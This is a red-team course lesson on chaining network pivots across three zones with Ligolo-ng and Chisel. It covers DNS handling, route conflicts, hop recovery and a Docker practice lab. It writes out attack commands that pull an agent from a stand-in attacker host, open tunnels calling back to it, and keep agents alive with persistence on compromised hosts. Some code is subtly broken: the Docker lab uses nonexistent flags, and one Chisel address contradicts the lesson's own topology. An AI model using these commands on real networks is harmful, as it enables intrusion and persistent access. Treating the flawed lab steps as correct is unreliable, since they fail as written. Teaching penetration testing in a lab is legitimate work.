---
title: "Three-Zone Pivoting and Deep Network Navigation"
tags: [red-team, pivoting, multi-hop, Ligolo-ng, Chisel, proxychains, SOCKS5,
  network-segmentation, three-zone, deep-pivot, routing, DNS-over-proxy,
  T1090, ATT&CK, lab, network-navigation]
module: 08-RedTeam-03
day: 547
related_topics:
  - Advanced LOLAD (Day 546)
  - Full Engagement Simulation (Day 548)
  - Offshore Environment Methodology (Day 534)
  - Offshore Lab Episode 1 (Day 535)
  - Offshore Lab Episode 2 (Day 536)
---

# Day 547 — Three-Zone Pivoting and Deep Network Navigation

> "Two-hop pivots you can manage manually. Three hops is where most operators
> start making mistakes — routing tables conflict, DNS leaks, tools time out
> because the round-trip across three hops is too slow. You need a system.
> Not heroics — a reliable, documented, repeatable pivot chain that you can
> rebuild in fifteen minutes from scratch if one hop goes down."
>
> — Ghost

---

## Goals

Build a reliable three-zone pivot chain from external through DMZ to a
deep internal segment.
Solve DNS leakage across multi-hop proxy chains.
Configure Ligolo-ng for multi-interface routing on a single agent.
Handle conflicting IP ranges across zones using routing rules.
Recover from a dropped pivot hop without losing the engagement.

**Prerequisites:** Day 534 (pivot methodology), Days 535–536 (Offshore lab
pivoting practice), Ligolo-ng and Chisel experience.
**Time budget:** 5 hours (hands-on lab focus).

---

## Part 1 — Network Architecture: The Three-Zone Problem

```
Zone layout (typical Offshore-style complex environment):

  EXTERNAL ZONE (10.10.110.0/24)
    → Internet-facing hosts: web servers, VPN, mail
    → Your entry point from the attack host
    → You compromised: EXT-HOST (10.10.110.10)

  DMZ (192.168.10.0/24)
    → Hosts connecting external and internal zones
    → Only reachable from EXT-HOST (firewall ACL)
    → You compromised: DMZ-HOST (192.168.10.20)

  INTERNAL LAN (10.10.10.0/24)
    → Domain controllers, workstations, file servers
    → Only reachable from DMZ (restricted ACL)
    → You need to reach: DC01 (10.10.10.5), WKS-01 (10.10.10.15)

  IT MANAGEMENT ZONE (172.16.10.0/24)
    → Admin jump servers, monitoring, backup
    → Only reachable from INTERNAL LAN
    → Your target: ADMIN-HOST (172.16.10.100)

Network diagram:
  AttackHost ──[internet]──► EXT-HOST (10.10.110.10)
                                   │
                         ──[ACL: 110→192]──►
                                   │
                              DMZ-HOST (192.168.10.20)
                                   │
                         ──[ACL: 192→10.10]──►
                                   │
                           DC01 (10.10.10.5)
                                   │
                         ──[ACL: 10.10→172.16]──►
                                   │
                          ADMIN-HOST (172.16.10.100)
```

---

## Part 2 — Method A: Ligolo-ng Multi-Agent Pivot Chain

```
Ligolo-ng architecture for three-zone pivot:

  Agent 1 (on EXT-HOST):
    → Connects from EXT-HOST to Attack Host on port 11601
    → Tunnels: everything for 192.168.10.0/24

  Agent 2 (on DMZ-HOST):
    → Deployed through Agent 1's tunnel
    → Connects from DMZ-HOST to Attack Host (via Agent 1 relay)
    → Tunnels: everything for 10.10.10.0/24

  Agent 3 (optional — on a 10.10.10.x host):
    → Tunnels: everything for 172.16.10.0/24

Result: Attack Host has three routing entries:
  192.168.10.0/24 → via ligolo interface (Agent 1)
  10.10.10.0/24   → via ligolo interface (Agent 2)
  172.16.10.0/24  → via ligolo interface (Agent 3)
```

### Step-by-Step Ligolo-ng Three-Zone Setup

```bash
# PREREQUISITE: Ligolo-ng proxy running on attack host (always-on):
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# ══════════════════════════════════════
# HOP 1: EXT-HOST (10.10.110.10)
# ══════════════════════════════════════

# Upload agent to EXT-HOST via web shell / initial access shell:
wget http://AttackHost:8000/agent -O /tmp/agent
chmod +x /tmp/agent

# Start agent on EXT-HOST (connects back to attack host):
/tmp/agent -connect AttackHost:11601 -ignore-cert &

# In Ligolo-ng console on attack host:
ligolo-ng » session          # select EXT-HOST agent (session 1)
ligolo-ng » start            # start the tunnel for session 1
# Set up routing for 192.168.10.0/24:
sudo ip route add 192.168.10.0/24 dev ligolo

# Test:
ping 192.168.10.20           # should reach DMZ-HOST via EXT-HOST

# ══════════════════════════════════════
# HOP 2: DMZ-HOST (192.168.10.20)
# ══════════════════════════════════════

# Deploy agent to DMZ-HOST via the now-reachable route:
scp agent user@192.168.10.20:/tmp/agent
ssh user@192.168.10.20 "chmod +x /tmp/agent && /tmp/agent -connect AttackHost:11601 -ignore-cert &"

# NOTE: 192.168.10.20 can reach AttackHost IF the firewall allows OUTBOUND
# from DMZ to internet on port 11601.
# IF NOT: relay the connection through EXT-HOST using Ligolo-ng listener:

# In Ligolo-ng console, create a listener on EXT-HOST for 192.168.10.x:
ligolo-ng [session 1] » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601
# This forwards port 11602 on EXT-HOST to 11601 on attack host

# On DMZ-HOST: connect to EXT-HOST:11602 (which relays to attack host):
/tmp/agent -connect 10.10.110.10:11602 -ignore-cert &

# Back in Ligolo-ng: select DMZ-HOST agent (session 2), start it:
ligolo-ng » session          # select session 2
ligolo-ng » start

# Route internal LAN through DMZ agent:
sudo ip route add 10.10.10.0/24 dev ligolo1   # second ligolo interface

# Test:
ping 10.10.10.5              # should reach DC01

# ══════════════════════════════════════
# HOP 3: Internal host → IT Mgmt zone
# ══════════════════════════════════════

# Deploy to a compromised 10.10.10.x host:
# Create listener on DMZ-HOST for 10.10.10.x → attack host relay:
ligolo-ng [session 2] » listener_add --addr 0.0.0.0:11603 --to 127.0.0.1:11601
# 10.10.10.x hosts connect to 192.168.10.20:11603 → relays to attack host

/tmp/agent -connect 192.168.10.20:11603 -ignore-cert &

# In Ligolo-ng: session 3, start, route:
sudo ip route add 172.16.10.0/24 dev ligolo2

# Test:
ping 172.16.10.100           # should reach ADMIN-HOST — full chain validated
```

---

## Part 3 — Method B: Chisel Chain (HTTP-Only Environments)

```
Use when: firewall blocks raw TCP but allows HTTP/HTTPS outbound.
Chisel creates a multiplexed HTTP tunnel.
```

```bash
# Hop 1: EXT-HOST reverse proxy to attack host
# On attack host:
./chisel server -p 8080 --reverse --socks5

# On EXT-HOST (HTTP allowed outbound):
./chisel client http://AttackHost:8080 R:1080:socks
# → proxychains on attack host now reaches 192.168.10.0/24 via EXT-HOST

# Hop 2: DMZ-HOST through EXT-HOST
# Start a Chisel server on EXT-HOST (on an internal port):
ssh -L 8081:127.0.0.1:8081 user@EXT-HOST  # port forward via hop 1 SSH
# or: start chisel server ON EXT-HOST and reach it via the hop 1 socks proxy

# On EXT-HOST:
./chisel server -p 9090 --reverse --socks5

# On DMZ-HOST (reachable via hop 1 via proxychains):
proxychains ./chisel client http://192.168.10.10:9090 R:1081:socks
# → second SOCKS proxy now on 127.0.0.1:1081 → reaches 10.10.10.0/24

# proxychains config for two hops:
# [ProxyList]
# socks5 127.0.0.1 1080   ← hop 1 (external → DMZ)
# socks5 127.0.0.1 1081   ← hop 2 (DMZ → internal)
```

---

## Part 4 — DNS Handling Across Pivot Chains

```
Problem: DNS leakage breaks tool functionality and OPSEC

  Without proxy_dns in proxychains:
  → Your attack host resolves "DC01.corp.local" via YOUR DNS (fails or leaks)
  → Tools get wrong IPs or cannot resolve internal hostnames
  → DNS queries for internal names appear in your ISP's DNS logs

  With proxy_dns in proxychains:
  → DNS queries are forwarded through the SOCKS proxy
  → The query is resolved by the pivot host (which is on the internal network)
  → Correct IP returned; no DNS leakage from your attack host

proxychains4.conf configuration:
  proxy_dns                   ← ALWAYS enable for internal name resolution
  dynamic_chain
  socks5 127.0.0.1 1080

For Ligolo-ng (routed, not proxy-based):
  → Add the internal DNS server to /etc/resolv.conf:
  echo "nameserver 10.10.10.5" >> /etc/resolv.conf   # DC01 = internal DNS
  → Now: nslookup DC01.corp.local → resolves via DC (through Ligolo tunnel)
  → Test: host corp.local 10.10.10.5

Verify no DNS leakage:
  On attack host: run tcpdump on the external interface during an nmap through pivot
  tcpdump -i eth0 port 53
  → You should see NO DNS traffic on eth0 (it should all go through the tunnel)
```

---

## Part 5 — Conflict Resolution for Overlapping IP Ranges

```
Problem: in complex environments, internal subnets may overlap with
  your attack host's home network or with each other.

Example:
  Your home network:      192.168.1.0/24
  Target DMZ zone:        192.168.10.0/24   (different — no conflict)
  Target IT Mgmt zone:    192.168.1.0/24    (CONFLICT with your home network!)

Solution: specific route with higher priority (lower metric)
  On Linux, routes have a metric — lower metric = higher priority

  # Check current routes:
  ip route show

  # Add the tunnel route with lower metric than the home network:
  sudo ip route add 192.168.1.0/24 dev ligolo metric 10
  # (your home network route has default metric 100)
  # → traffic to 192.168.1.x goes through the tunnel, not your home router

  # Or: use a specific host route for the target:
  sudo ip route add 192.168.1.50/32 dev ligolo  # specific host via tunnel

  # Verify:
  ip route get 192.168.1.50   # should show via ligolo, not home gateway
```

---

## Part 6 — Pivot Recovery: When a Hop Goes Down

```
Scenario: you are three hops deep into the network. The hop-1 agent
on EXT-HOST dies (process killed, host rebooted, network blip).
All hops 2 and 3 are also down.

Recovery procedure:

1. Assess: which hop died?
   → Try to reach hop-1 target directly: ping 10.10.110.10 from attack host
   → If reachable: re-deploy agent only (no need to re-exploit)
   → If NOT reachable: exploit the initial access vector again

2. Keep hop-2 and hop-3 agents alive during hop-1 outage?
   → If hop-2 and hop-3 are persistence-enabled (cron, WMI, scheduled task):
     They will reconnect once hop-1 is restored
   → If not persistence-enabled: you need to redeploy manually

3. Restore hop-1 first:
   → Re-run the hop-1 agent on EXT-HOST (via initial access shell or backup RCE)
   → Verify Ligolo-ng proxy reconnects (session appears in console)

4. Re-create listeners for hop-2 connection:
   → Re-add listener on hop-1 for hop-2 relay
   → Verify hop-2 agent reconnects

5. Verify full chain:
   → Ping/nmap through all three hops before continuing
   → Update notes: chain is restored at <timestamp>

Resilience best practices:
  → Deploy agent with persistence on every pivot host (cron or scheduled task)
  → Use multiple reconnect intervals on agents (--reconnect-sleep 10)
  → Keep a second backup pivot method ready (Chisel backup if Ligolo down)
  → Document every step of the pivot setup — rebuild should take < 10 min
```

---

## Lab Exercise: Build and Validate a Three-Zone Chain

```
Lab setup required:
  Three network segments, each with a single host accessible from the previous:
  AttackHost → VM1 (zone1) → VM2 (zone2) → VM3 (zone3)
  
  Quick lab setup with Docker:
  docker network create zone1 --subnet 10.10.1.0/24
  docker network create zone2 --subnet 10.10.2.0/24
  docker network create zone3 --subnet 10.10.3.0/24
  
  docker run -d --name vm1 --network zone1 --ip 10.10.1.10 alpine sleep inf
  docker run -d --name vm2 --networks zone1,zone2 --ip-zone1 10.10.1.20 \
    --ip-zone2 10.10.2.10 alpine sleep inf
  docker run -d --name vm3 --network zone2,zone3 alpine sleep inf
  docker run -d --name vm3b --network zone3 --ip 10.10.3.10 alpine sleep inf

Exercise:
  1. Set up the full Ligolo-ng three-hop chain (45 min)
  2. Verify: nmap scan from attack host against 10.10.3.10 through the chain
  3. Simulate hop-1 failure: docker stop vm1
  4. Recover: restore hop-1 within 10 minutes
  5. Verify full chain is restored
  6. Document the complete setup procedure as a runbook
```

---

## Key Takeaways

1. Three-zone pivoting with Ligolo-ng uses the listener relay feature to
   chain agents through each other — each agent connects to the previous
   agent's relay listener rather than directly to the attack host. This
   keeps the attack host invisible to inner zones.
2. DNS across pivot chains is the most commonly forgotten configuration.
   A tool that reaches the target IP but cannot resolve internal hostnames
   fails silently. Always configure proxy_dns (Chisel) or update resolv.conf
   (Ligolo-ng) before running any tool that uses DNS.
3. Conflicting IP ranges between your network and the target require explicit
   routing rules with lower metrics. This is a solvable problem but requires
   knowing it exists before you hit it during a timed engagement.
4. Pivot resilience requires persistence on each agent. A pivot host that
   reboots overnight takes down all downstream hops. A cron job or scheduled
   task restarting the agent means the chain self-heals within minutes.
5. The recovery procedure is as important as the setup procedure. An operator
   who can set up a three-hop pivot in 20 minutes but takes 2 hours to restore
   it after a failure is not operationally reliable. Document and time your
   recovery procedure — it should be under 10 minutes.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q547.1, Q547.2 …).

---

## Navigation

← Previous: [Day 546 — Advanced LOLAD and LOLBAS](DAY-0546-Advanced-LOLAD-LOLBAS.md)
→ Next: [Day 548 — Full Engagement Simulation: Alternate Scenario](DAY-0548-Full-Engagement-Simulation-Alternate.md)
